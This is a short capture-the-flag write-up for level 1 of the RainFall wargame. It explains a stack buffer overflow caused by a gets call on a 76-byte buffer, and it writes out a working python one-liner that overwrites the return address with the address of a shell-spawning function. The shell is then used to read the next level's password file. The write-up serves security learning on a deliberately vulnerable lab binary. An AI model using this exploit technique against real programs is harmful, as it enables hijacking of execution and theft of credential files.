# Level 1

From the source (thank you Ghidra), we can see the main calls the vulnerable function `gets` with a buffer of size 76.
We can also see another function called run.

So we can do a buffer overflow exploit where we fill the entire buffer with random values (here A's) and directly afterwards (in the return address), we write the memory address of the run function but in Little-Endian notation.
And we use `cat` to keep the shell open.

```shell
level1@RainFall:~$ gdb ./level1
[...]
Reading symbols from /home/user/level1/level1...(no debugging symbols found)...done.
(gdb) info functions
All defined functions:
Non-debugging symbols:
[...]
0x08048444  run
0x08048480  main
[...]
(gdb) quit
level1@RainFall:~$ (python -c 'print 76 * "A" + "\x44\x84\x04\x08"'; cat)  | ./level1
Good... Wait what?
cat /home/user/level2/.pass
[censored]
```
